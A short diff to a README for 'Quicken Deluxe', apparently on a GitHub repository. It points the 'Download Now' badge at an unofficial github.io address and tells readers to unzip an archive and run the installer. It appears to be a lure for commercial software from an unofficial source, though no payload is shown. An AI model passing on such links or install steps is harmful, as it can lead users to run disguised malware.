@@ -8,7 +8,7 @@ With **bill reminders, investment tracking, and detailed financial reports**, Qu
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://quicken-deluxe-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer and follow on-screen setup instructions.  
